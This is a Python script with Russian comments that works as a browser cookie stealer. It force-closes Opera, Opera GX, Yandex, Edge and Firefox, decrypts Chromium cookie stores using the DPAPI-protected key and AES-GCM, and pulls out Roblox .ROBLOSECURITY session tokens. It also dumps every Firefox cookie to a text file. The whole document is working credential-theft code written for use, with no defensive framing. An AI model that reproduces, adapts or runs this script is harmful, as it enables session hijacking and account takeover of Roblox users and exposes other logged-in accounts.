# -*- coding: utf-8 -*-
# Универсальный офлайн-скрипт:
# - Chromium (Opera/Opera GX, Yandex, Microsoft Edge): строгая расшифровка AES-GCM (v10/v11/v20) и извлечение .ROBLOSECURITY
# - Firefox: полный дамп cookies.sqlite в TXT
# - Токен .ROBLOSECURITY добавляется в итоговый файл roblosecurity_tokens.txt из ВСЕХ браузеров (включая Firefox)
# - Перед работой принудительно завершаются процессы всех поддерживаемых браузеров
# Итоговые файлы:
#   1) firefox_cookies_dump.txt
#   2) roblosecurity_tokens.txt
# Единый лог: run.log

import os
import json
import base64
import sqlite3
import shutil
import traceback
import logging
import tempfile
import subprocess

# Требуется: pip install pywin32 pycryptodome
try:
    from Crypto.Cipher import AES
except Exception:
    AES = None

try:
    import win32crypt  # DPAPI (Windows)
except Exception:
    win32crypt = None

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

OUT_FIREFOX = os.path.join(BASE_DIR, "firefox_cookies_dump.txt")
OUT_TOKENS  = os.path.join(BASE_DIR, "roblosecurity_tokens.txt")

LOG_PATH = os.path.join(BASE_DIR, "run.log")
logging.basicConfig(
    filename=LOG_PATH,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    encoding="utf-8"
)

TARGET_NAMES = {".ROBLOSECURITY", "ROBLOSECURITY"}

def log(msg: str, level: str = "info"):
    lvl = level.lower()
    if lvl == "error":
        logging.error(msg)
    elif lvl == "warning":
        logging.warning(msg)
    elif lvl == "debug":
        logging.debug(msg)
    else:
        logging.info(msg)
    print(msg)

def safe_decode(b):
    return b.decode("utf-8", errors="ignore") if isinstance(b, (bytes, bytearray)) else ("" if b is None else str(b))

# ================= Завершение процессов браузеров =================
def kill_browser_processes():
    # Список известных исполняемых имён
    procs = [
        "opera.exe", "opera_gx.exe", "yandex.exe", "browser.exe", "yandexbrowser.exe",
        "msedge.exe", "chrome_proxy.exe",  # Edge вспомогательные
        "firefox.exe"
    ]
    killed_any = False
    for p in procs:
        try:
            subprocess.run(["taskkill", "/f", "/im", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            killed_any = True
        except Exception:
            pass
    if killed_any:
        log("Процессы браузеров остановлены (taskkill).")
    else:
        log("Процессы браузеров не обнаружены или уже остановлены.")

# ================= Chromium: Opera / Opera GX =================
def detect_opera_paths():
    roaming = os.environ.get("APPDATA", "")
    base_gx = os.path.join(roaming, "Opera Software", "Opera GX Stable")
    base_op = os.path.join(roaming, "Opera Software", "Opera Stable")
    candidates = []
    for base, browser_name in ((base_gx, "Opera GX"), (base_op, "Opera")):
        ls = os.path.join(base, "Local State")
        ck_default = os.path.join(base, "Default", "Network", "Cookies")
        if os.path.exists(ls) and os.path.exists(ck_default):
            candidates.append((browser_name, "Default", ls, ck_default))
        if os.path.exists(base):
            for d in os.listdir(base):
                if d.startswith("Profile "):
                    ck = os.path.join(base, d, "Network", "Cookies")
                    if os.path.exists(ls) and os.path.exists(ck):
                        candidates.append((browser_name, d, ls, ck))
    return candidates

# ================= Chromium: Yandex Browser =================
def detect_yandex_paths():
    local = os.environ.get("LOCALAPPDATA", "")
    user_data = os.path.join(local, "Yandex", "YandexBrowser", "User Data")
    candidates = []
    if os.path.exists(user_data):
        ls = os.path.join(user_data, "Local State")
        if os.path.exists(ls):
            ck_default = os.path.join(user_data, "Default", "Network", "Cookies")
            if os.path.exists(ck_default):
                candidates.append(("Yandex Browser", "Default", ls, ck_default))
            for d in os.listdir(user_data):
                if d.startswith("Profile "):
                    ck = os.path.join(user_data, d, "Network", "Cookies")
                    if os.path.exists(ck):
                        candidates.append(("Yandex Browser", d, ls, ck))
    return candidates

# ================= Chromium: Microsoft Edge =================
def detect_edge_paths():
    local = os.environ.get("LOCALAPPDATA", "")
    user_data = os.path.join(local, "Microsoft", "Edge", "User Data")
    candidates = []
    if os.path.exists(user_data):
        ls = os.path.join(user_data, "Local State")
        if os.path.exists(ls):
            ck_default = os.path.join(user_data, "Default", "Network", "Cookies")
            if os.path.exists(ck_default):
                candidates.append(("Microsoft Edge", "Default", ls, ck_default))
            for d in os.listdir(user_data):
                if d.startswith("Profile "):
                    ck = os.path.join(user_data, d, "Network", "Cookies")
                    if os.path.exists(ck):
                        candidates.append(("Microsoft Edge", d, ls, ck))
    return candidates

# ================= Общие функции для Chromium =================
def load_chromium_key(local_state_file: str) -> bytes:
    if win32crypt is None:
        raise RuntimeError("pywin32 не установлен — не могу извлечь DPAPI ключ для Chromium.")
    with open(local_state_file, "r", encoding="utf-8") as f:
        ls = json.load(f)
    enc_b64 = ls.get("os_crypt", {}).get("encrypted_key")
    if not enc_b64:
        raise ValueError("В Local State отсутствует os_crypt.encrypted_key.")
    enc = base64.b64decode(enc_b64)
    if enc.startswith(b"DPAPI"):
        enc = enc[5:]
    desc, key = win32crypt.CryptUnprotectData(enc, None, None, None, 0)
    if not isinstance(key, (bytes, bytearray)):
        raise ValueError("DPAPI вернул не bytes.")
    return bytes(key)

def decrypt_chromium_value(ev: bytes, key: bytes) -> str:
    if AES is None:
        raise RuntimeError("pycryptodome не установлен — AES-GCM недоступен.")
    if not ev:
        return ""
    if len(ev) < 3 or ev[:3] not in (b"v10", b"v11", b"v20"):
        return safe_decode(ev)
    nonce = ev[3:15]
    ct = ev[15:-16]
    tag = ev[-16:]
    if len(nonce) != 12 or len(tag) != 16 or len(ct) <= 0:
        raise ValueError("Неверные длины полей GCM.")
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    pt = cipher.decrypt_and_verify(ct, tag)
    return pt.decode("utf-8", errors="ignore").rstrip("\x00")

def open_chromium_cookies_via_warm_copy(cookies_path, temp_tag):
    """
    Делаем тёплую копию Cookies (+-wal/-shm если есть) в temp, чтобы исключить блокировки и WAL-состояния.
    Возвращает (conn, local_copy_path, temp_dir).
    """
    temp_dir = os.path.join(tempfile.gettempdir(), f"cookies_copy_{temp_tag}")
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass
    os.makedirs(temp_dir, exist_ok=True)

    base_name = "Cookies"
    local_copy = os.path.join(temp_dir, base_name)
    shutil.copy2(cookies_path, local_copy)
    for suffix in ("-wal", "-shm"):
        src_side = cookies_path + suffix
        if os.path.exists(src_side):
            try:
                shutil.copy2(src_side, local_copy + suffix)
            except Exception as e:
                logging.error(f"WAL/SHM copy failed: {src_side}: {e}")

    conn = sqlite3.connect(local_copy)
    conn.text_factory = bytes
    return conn, local_copy, temp_dir

def process_chromium_for_token(browser_name: str, profile_name: str, local_state_path: str, cookies_path: str):
    tokens = []
    temp_tag = f"{browser_name.replace(' ','_')}_{profile_name.replace(' ','_')}"
    conn = None
    tmp_dir = None
    try:
        key = load_chromium_key(local_state_path)
        conn, local_copy, tmp_dir = open_chromium_cookies_via_warm_copy(cookies_path, temp_tag)
        cur = conn.cursor()
        try:
            cur.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE name IN (?, ?)",
                        (".ROBLOSECURITY", "ROBLOSECURITY"))
        except Exception:
            cur.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
        for host_b, name_b, val_b, ev_b in cur:
            host = safe_decode(host_b).lower()
            name = safe_decode(name_b)
            if name not in TARGET_NAMES:
                continue
            if not (host == "roblox.com" or host.endswith(".roblox.com")):
                continue

            val = safe_decode(val_b) if isinstance(val_b, (bytes, bytearray)) else (val_b or "")
            ev = bytes(ev_b) if isinstance(ev_b, (bytes, bytearray)) else None

            # Сначала пробуем plaintext value
            if val and ("WARNING:-DO-NOT-SHARE-THIS" in val or val.startswith("_|WARNING") or len(val) > 64):
                tokens.append((browser_name, profile_name, host, name, val))
                continue

            # Иначе расшифровка encrypted_value
            if ev:
                try:
                    dec = decrypt_chromium_value(ev, key)
                    if dec and ("WARNING:-DO-NOT-SHARE-THIS" in dec or dec.startswith("_|WARNING") or len(dec) > 64):
                        tokens.append((browser_name, profile_name, host, name, dec))
                except Exception as e:
                    logging.error(f"[{browser_name}:{profile_name}] decrypt error {host}/{name}: {e}\n{traceback.format_exc()}")
    finally:
        try:
            if conn:
                conn.close()
        except:
            pass
        try:
            if tmp_dir and os.path.exists(tmp_dir):
                shutil.rmtree(tmp_dir, ignore_errors=True)
        except:
            pass
    return tokens

# ================= Firefox =================
def detect_firefox_profiles():
    roaming = os.environ.get("APPDATA", "")
    profiles_dir = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    res = []
    if os.path.exists(profiles_dir):
        for d in os.listdir(profiles_dir):
            prof_dir = os.path.join(profiles_dir, d)
            ck = os.path.join(prof_dir, "cookies.sqlite")
            if os.path.isdir(prof_dir) and os.path.exists(ck):
                res.append((d, ck))
    return res

def dump_firefox_cookies(profile_name: str, cookies_path: str):
    conn = sqlite3.connect(f"file:{cookies_path}?mode=ro", uri=True)
    conn.text_factory = bytes
    cur = conn.cursor()
    total = 0
    try:
        cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
        rows = cur.fetchall()
    except Exception:
        cur.execute("SELECT host, name, value FROM moz_cookies")
        rows = [(h, n, v, b"", 0, 0, 0) for (h, n, v) in cur.fetchall()]
    with open(OUT_FIREFOX, "a", encoding="utf-8") as out:
        out.write(f"===== Firefox Profile: {profile_name} =====\n")
        for r in rows:
            total += 1
            host = safe_decode(r[0])
            name = safe_decode(r[1])
            val  = safe_decode(r[2])
            path = safe_decode(r[3]) if len(r) > 3 else ""
            expiry = r[4] if len(r) > 4 else ""
            isSecure = r[5] if len(r) > 5 else ""
            isHttpOnly = r[6] if len(r) > 6 else ""
            out.write(f"Host: {host} | Name: {name} | Value: {val} | Path: {path} | Expiry: {expiry} | Secure: {isSecure} | HttpOnly: {isHttpOnly}\n")
        out.write("\n")
    conn.close()
    log(f"[Firefox:{profile_name}] dump записан, строк: {total}")

def get_roblosecurity_from_firefox(profile_name: str, cookies_path: str):
    tokens = []
    conn = sqlite3.connect(f"file:{cookies_path}?mode=ro", uri=True)
    conn.text_factory = bytes
    cur = conn.cursor()
    try:
        cur.execute("SELECT host, name, value FROM moz_cookies WHERE name IN (?, ?)", (".ROBLOSECURITY", "ROBLOSECURITY"))
    except Exception:
        cur.execute("SELECT host, name, value FROM moz_cookies")
    for host_b, name_b, val_b in cur:
        host = safe_decode(host_b).lower()
        name = safe_decode(name_b)
        val  = safe_decode(val_b)
        if name in TARGET_NAMES and (host == "roblox.com" or host.endswith(".roblox.com")):
            if val and ("WARNING:-DO-NOT-SHARE-THIS" in val or val.startswith("_|WARNING") or len(val) > 64):
                tokens.append(("Firefox", profile_name, host, name, val))
    conn.close()
    return tokens

# ================= Main =================
def main():
    # Очистка итоговых файлов
    for p in (OUT_FIREFOX, OUT_TOKENS, LOG_PATH):
        try:
            if os.path.exists(p):
                os.remove(p)
        except:
            pass

    log("Старт: завершаю процессы браузеров...")
    kill_browser_processes()

    log("Chromium (Opera/Opera GX, Yandex, Edge) — строгая расшифровка; Firefox — полный дамп в TXT. Единый лог run.log.")

    all_tokens = []

        # Opera/Opera GX
    opera_candidates = detect_opera_paths()
    if opera_candidates:
        log(f"Найдено профилей Opera/Opera GX: {len(opera_candidates)}")
        total_tokens_opera = 0
        for browser, profile, ls, ck in opera_candidates:
            try:
                log(f"[{browser}:{profile}] обработка…")
                toks = process_chromium_for_token(browser, profile, ls, ck)
                total_tokens_opera += len(toks)
                all_tokens.extend(toks)
                log(f"[{browser}:{profile}] токенов найдено: {len(toks)}")
            except Exception as e:
                log(f"[{browser}:{profile}] ошибка: {e}\n{traceback.format_exc()}", level="error")
        log(f"Итого по Opera/Opera GX токенов найдено: {total_tokens_opera}")
    else:
        log("Opera/Opera GX профили не найдены.")

    # Yandex
    yandex_candidates = detect_yandex_paths()
    if yandex_candidates:
        log(f"Найдено профилей Yandex Browser: {len(yandex_candidates)}")
        total_tokens_yandex = 0
        for browser, profile, ls, ck in yandex_candidates:
            try:
                log(f"[{browser}:{profile}] обработка…")
                toks = process_chromium_for_token(browser, profile, ls, ck)
                total_tokens_yandex += len(toks)
                all_tokens.extend(toks)
                log(f"[{browser}:{profile}] токенов найдено: {len(toks)}")
            except Exception as e:
                log(f"[{browser}:{profile}] ошибка: {e}\n{traceback.format_exc()}", level="error")
        log(f"Итого по Yandex Browser токенов найдено: {total_tokens_yandex}")
    else:
        log("Yandex Browser профили не найдены.")

    # Microsoft Edge
    edge_candidates = detect_edge_paths()
    if edge_candidates:
        log(f"Найдено профилей Microsoft Edge: {len(edge_candidates)}")
        total_tokens_edge = 0
        for browser, profile, ls, ck in edge_candidates:
            try:
                log(f"[{browser}:{profile}] обработка…")
                toks = process_chromium_for_token(browser, profile, ls, ck)
                total_tokens_edge += len(toks)
                all_tokens.extend(toks)
                log(f"[{browser}:{profile}] токенов найдено: {len(toks)}")
            except Exception as e:
                log(f"[{browser}:{profile}] ошибка: {e}\n{traceback.format_exc()}", level="error")
        log(f"Итого по Microsoft Edge токенов найдено: {total_tokens_edge}")
    else:
        log("Microsoft Edge профили не найдены.")


    # Firefox — дамп + токен
    ff_profiles = detect_firefox_profiles()
    if ff_profiles:
        for prof_name, ck in ff_profiles:
            try:
                log(f"[Firefox:{prof_name}] делаю дамп cookies.sqlite…")
                dump_firefox_cookies(prof_name, ck)
            except Exception as e:
                log(f"[Firefox:{prof_name}] ошибка дампа: {e}\n{traceback.format_exc()}", level="error")
            try:
                toks = get_roblosecurity_from_firefox(prof_name, ck)  # ДОБАВЛЕНО: токены из Firefox тоже идут в общий файл
                all_tokens.extend(toks)
                log(f"[Firefox:{prof_name}] токенов найдено: {len(toks)}")
            except Exception as e:
                log(f"[Firefox:{prof_name}] ошибка извлечения токена: {e}\n{traceback.format_exc()}", level="error")
    else:
        log("Firefox профили с cookies.sqlite не найдены.")

    # Итоговый файл с токенами (включая Firefox)
    with open(OUT_TOKENS, "w", encoding="utf-8") as out:
        if not all_tokens:
            out.write("Токены .ROBLOSECURITY не найдены.\n")
        else:
            for browser, profile, host, name, val in all_tokens:
                out.write("===== Roblox Security Token =====\n")
                out.write(f"Browser: {browser}\n")
                out.write(f"Profile: {profile}\n")
                out.write(f"Host: {host}\n")
                out.write(f"Name: {name}\n")
                out.write(f"Value: {val}\n")
                out.write("---------------------------------\n")

    log(f"Готово. Итоговые файлы:\n1) {OUT_FIREFOX}\n2) {OUT_TOKENS}\nЕдиный лог: {LOG_PATH}")

if __name__ == "__main__":
    main()
